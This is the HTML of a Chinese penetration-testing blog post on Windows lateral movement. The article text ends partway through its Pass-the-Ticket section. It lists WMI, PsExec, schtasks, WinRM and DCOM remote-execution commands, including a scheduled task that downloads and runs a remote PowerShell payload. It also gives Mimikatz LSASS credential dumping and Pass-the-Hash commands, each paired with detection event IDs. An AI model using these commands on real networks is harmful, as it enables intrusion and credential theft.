@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="概述横向移动（Lateral Movement）是内网渗透的核心环节。攻击者获得初始立足点后，需横向移动以扩大控制范围、获取更高权限或接近最终目标。本文系统梳理主流横向移动技术，涵盖Windows远程执行方法、凭证重用攻击、Token窃取与工具使用。  一、Windows远程执行技术1.1 WMI (Windows Management Instrumentation)WMI通过DCOM协议（13">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动技术汇总">
+<meta property="og:url" content="https://congliang.github.io/Intranet-lateral-movement/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="概述横向移动（Lateral Movement）是内网渗透的核心环节。攻击者获得初始立足点后，需横向移动以扩大控制范围、获取更高权限或接近最终目标。本文系统梳理主流横向移动技术，涵盖Windows远程执行方法、凭证重用攻击、Token窃取与工具使用。  一、Windows远程执行技术1.1 WMI (Windows Management Instrumentation)WMI通过DCOM协议（13">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-08-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.907Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-lateral-movement/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-lateral-movement/","path":"Intranet-lateral-movement/","title":"横向移动技术汇总"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>横向移动技术汇总 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Windows%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF"><span class="nav-number">2.</span> <span class="nav-text">一、Windows远程执行技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-WMI-Windows-Management-Instrumentation"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 WMI (Windows Management Instrumentation)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-PsExec"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 PsExec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-Scheduled-Tasks"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 计划任务 (Scheduled Tasks)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-WinRM-PowerShell-Remoting"><span class="nav-number">2.4.</span> <span class="nav-text">1.4 WinRM &amp; PowerShell Remoting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-DCOM-Distributed-Component-Object-Model"><span class="nav-number">2.5.</span> <span class="nav-text">1.5 DCOM (Distributed Component Object Model)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%87%AD%E8%AF%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">二、凭证重用攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Pass-the-Hash-PtH"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 Pass-the-Hash (PtH)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Pass-the-Ticket-PtT"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 Pass-the-Ticket (PtT)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Overpass-the-Hash-Pass-the-Key"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 Overpass-the-Hash (Pass-the-Key)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Token%E7%AA%83%E5%8F%96%E4%B8%8E%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="nav-number">4.</span> <span class="nav-text">三、Token窃取与会话劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Access-Token%E7%AA%83%E5%8F%96"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 Access Token窃取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-RDP-Session-Hijacking%EF%BC%88RDP%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 RDP Session Hijacking（RDP会话劫持）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97"><span class="nav-number">5.</span> <span class="nav-text">四、工具指南</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-CrackMapExec-NetExec"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 CrackMapExec (NetExec)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-Impacket"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 Impacket</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94"><span class="nav-number">6.</span> <span class="nav-text">五、综合技术对比</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 远程执行技术对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E5%87%AD%E8%AF%81%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 凭证攻击技术对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%B7%A5%E5%85%B7%E8%83%BD%E5%8A%9B%E7%9F%A9%E9%98%B5"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 工具能力矩阵</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">六、防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">8.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-lateral-movement/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="横向移动技术汇总 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          横向移动技术汇总
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-08-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-08-05T08:00:00+08:00">2025-08-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>横向移动（Lateral Movement）是内网渗透的核心环节。攻击者获得初始立足点后，需横向移动以扩大控制范围、获取更高权限或接近最终目标。本文系统梳理主流横向移动技术，涵盖Windows远程执行方法、凭证重用攻击、Token窃取与工具使用。</p>
+<hr>
+<h2 id="一、Windows远程执行技术"><a href="#一、Windows远程执行技术" class="headerlink" title="一、Windows远程执行技术"></a>一、Windows远程执行技术</h2><h3 id="1-1-WMI-Windows-Management-Instrumentation"><a href="#1-1-WMI-Windows-Management-Instrumentation" class="headerlink" title="1.1 WMI (Windows Management Instrumentation)"></a>1.1 WMI (Windows Management Instrumentation)</h3><p>WMI通过DCOM协议（135端口 + 动态RPC端口范围）进行远程管理通信。前提是需要目标管理员凭据且RPC服务开启。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wmic远程执行命令</span></span><br><span class="line">wmic /node:192.168.1.50 /user:administrator /password:P@ssw0rd process call create <span class="string">&quot;cmd.exe /c whoami &gt; C:\tmp\result.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerShell通过WMI创建远程进程</span></span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> Win32_Process <span class="literal">-Name</span> Create <span class="literal">-ArgumentList</span> <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.50</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"><span class="comment"># 远程侦察信息收集</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_OperatingSystem <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.50</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>检测要点</strong>：监控<code>Microsoft-Windows-WMI-Activity/Operational</code>日志（Event ID 5857, 5860, 5861），关注<code>svchost.exe</code> → <code>WinMgmt.exe</code>的异常子进程创建。</p>
+<h3 id="1-2-PsExec"><a href="#1-2-PsExec" class="headerlink" title="1.2 PsExec"></a>1.2 PsExec</h3><p>PsExec通过SMB（445端口）将<code>PSEXESVC.exe</code>上传到<code>ADMIN$</code>共享（<code>C:\Windows</code>），再通过服务控制管理器注册并启动临时服务，以<code>SYSTEM</code>权限执行命令，完毕自动清理服务注册表项。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程执行并获得交互式Shell</span></span><br><span class="line">PsExec.exe \\192.168.1.50 -u administrator -p P@ssw0rd cmd.exe</span><br><span class="line"><span class="comment"># 以SYSTEM权限执行</span></span><br><span class="line">PsExec.exe \\192.168.1.50 -s cmd.exe</span><br><span class="line"><span class="comment"># 批量执行（配合targets.txt目标列表）</span></span><br><span class="line">PsExec.exe @targets.txt -u administrator -p P@ssw0rd ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测特征</strong>：Event ID 7045（服务创建，服务名含<code>PSEXESVC</code>）；SMB <code>ADMIN$</code>共享的异常文件写入；登录类型3与4672特权分配事件的关联。</p>
+<h3 id="1-3-计划任务-Scheduled-Tasks"><a href="#1-3-计划任务-Scheduled-Tasks" class="headerlink" title="1.3 计划任务 (Scheduled Tasks)"></a>1.3 计划任务 (Scheduled Tasks)</h3><p>通过<code>schtasks</code>在远程主机创建计划任务执行命令，基于RPC&#x2F;SMB协议。优势是不需要在目标上传二进制文件，部分安全产品对其检测较弱。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建远程计划任务</span></span><br><span class="line">schtasks /create /s 192.168.1.50 /u administrator /p P@ssw0rd /tn <span class="string">&quot;UpdateTask&quot;</span> \</span><br><span class="line">    /tr <span class="string">&quot;powershell.exe -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.100/payload.ps1&#x27;)&quot;</span> \</span><br><span class="line">    /sc once /st 00:00</span><br><span class="line"><span class="comment"># 立即执行</span></span><br><span class="line">schtasks /run /s 192.168.1.50 /u administrator /p P@ssw0rd /tn <span class="string">&quot;UpdateTask&quot;</span></span><br><span class="line"><span class="comment"># 清理痕迹</span></span><br><span class="line">schtasks /delete /s 192.168.1.50 /u administrator /p P@ssw0rd /tn <span class="string">&quot;UpdateTask&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测</strong>：<code>Microsoft-Windows-TaskScheduler/Operational</code>日志（Event ID 106, 140, 141），非工作时间的<code>schtasks.exe</code>调用，SYSTEM权限运行且含可疑命令行的计划任务。</p>
+<h3 id="1-4-WinRM-PowerShell-Remoting"><a href="#1-4-WinRM-PowerShell-Remoting" class="headerlink" title="1.4 WinRM &amp; PowerShell Remoting"></a>1.4 WinRM &amp; PowerShell Remoting</h3><p>WinRM基于HTTP(S)（5985&#x2F;5986端口），是PowerShell Remoting的底层协议。相比DCOM方式，穿越防火墙能力更强。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标启用WinRM</span></span><br><span class="line">winrm quickconfig</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 交互式远程会话</span></span><br><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.50</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"><span class="comment"># 一对多并行执行</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.50</span>, <span class="number">192.168</span>.<span class="number">1.51</span> <span class="literal">-ScriptBlock</span> &#123; whoami &#125; <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"><span class="comment"># 创建持久会话供复用</span></span><br><span class="line"><span class="variable">$session</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.50</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$session</span> <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">Get-Process</span> lsass &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>多跳问题</strong>：从A→B→C时，B无法将凭证传递到C（Second Hop Problem）。解决方案是启用CredSSP认证：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enable-WSManCredSSP</span> <span class="literal">-Role</span> Client <span class="literal">-DelegateComputer</span> <span class="string">&quot;*.domain.com&quot;</span>    <span class="comment"># 中间主机</span></span><br><span class="line"><span class="built_in">Enable-WSManCredSSP</span> <span class="literal">-Role</span> Server                                     <span class="comment"># 目标主机</span></span><br><span class="line"><span class="built_in">New-PSSession</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.50</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-Authentication</span> CredSSP</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测</strong>：<code>Microsoft-Windows-PowerShell/Operational</code>日志（Event ID 4104脚本块、4103管道执行、53504 Session创建）；<code>Microsoft-Windows-WinRM/Operational</code>日志。</p>
+<h3 id="1-5-DCOM-Distributed-Component-Object-Model"><a href="#1-5-DCOM-Distributed-Component-Object-Model" class="headerlink" title="1.5 DCOM (Distributed Component Object Model)"></a>1.5 DCOM (Distributed Component Object Model)</h3><p>DCOM允许在远程主机上实例化COM对象并调用其方法，基于RPC（135 + 动态端口）。可利用的COM对象包括<code>MMC20.Application</code>、<code>ShellWindows</code>、<code>ShellBrowserWindow</code>、<code>Excel.Application</code>。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MMC20.Application — 远程进程创建</span></span><br><span class="line">[<span class="type">System.Activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>, <span class="string">&quot;192.168.1.50&quot;</span>)) \</span><br><span class="line">    .Document.ActiveView.ExecuteShellCommand(<span class="string">&quot;cmd.exe&quot;</span>, <span class="variable">$null</span>, <span class="string">&quot;/c calc.exe&quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ShellWindows — 适用于Win7/Win2008R2等早期版本</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>, <span class="string">&quot;192.168.1.50&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span> = [<span class="type">System.Activator</span>]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$obj</span>.Item().Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c calc.exe&quot;</span>, <span class="string">&quot;C:\Windows\System32&quot;</span>, <span class="variable">$null</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ShellBrowserWindow — Win10/Win2016+适用</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">&#x27;c08afd90-f2a1-11d1-8455-00a0c91f3880&#x27;</span>, <span class="string">&quot;192.168.1.50&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span> = [<span class="type">System.Activator</span>]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$obj</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c calc.exe&quot;</span>, <span class="string">&quot;C:\Windows\System32&quot;</span>, <span class="variable">$null</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测</strong>：<code>Microsoft-Windows-DistributedCOM</code>日志（Event ID 10016, 10028）；非用户目录下Office进程的启动；<code>svchost.exe</code> → <code>DcomLaunch</code>下的异常子进程。</p>
+<hr>
+<h2 id="二、凭证重用攻击"><a href="#二、凭证重用攻击" class="headerlink" title="二、凭证重用攻击"></a>二、凭证重用攻击</h2><h3 id="2-1-Pass-the-Hash-PtH"><a href="#2-1-Pass-the-Hash-PtH" class="headerlink" title="2.1 Pass-the-Hash (PtH)"></a>2.1 Pass-the-Hash (PtH)</h3><p>Windows NTLM认证仅需哈希即可完成网络身份验证。获取LSASS内存中的NTLM哈希后，无需破解明文即可访问远程网络资源。</p>
+<blockquote>
+<p><strong>限制</strong>：Win8.1 &#x2F; Server 2012 R2+引入受限管理员模式（Remote UAC），本地管理员（非RID 500）的网络令牌被剥离管理员权限。域账户或RID 500不受影响，或可设置<code>LocalAccountTokenFilterPolicy = 1</code>绕过。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz — 从内存提取哈希</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"><span class="comment"># Mimikatz — PtH执行（弹出新cmd窗口，在该窗口内具备目标身份）</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:corp.local /ntlm:&lt;NTLM-HASH&gt;&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Impacket工具集中的PtH</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50        <span class="comment"># WMI半交互Shell</span></span><br><span class="line">psexec.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50         <span class="comment"># SMB半交互Shell</span></span><br><span class="line">smbexec.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50        <span class="comment"># 较隐蔽的执行方式</span></span><br><span class="line">atexec.py -hashes :&lt;NTLM-HASH&gt; administrator@192.168.1.50 <span class="string">&quot;whoami&quot;</span> <span class="comment"># 计划任务执行单命令</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Pass-the-Ticket-PtT"><a href="#2-2-Pass-the-Ticket-PtT" class="headerlink" title="2.2 Pass-the-Ticket (PtT)"></a>2.2 Pass-the-Ticket (PtT)</h3><p>从LSASS内存提取Kerberos票据（TGT&#x2F;TGS），导入到当前会话以伪装成目标用户访问Kerberos认证服务。</p>
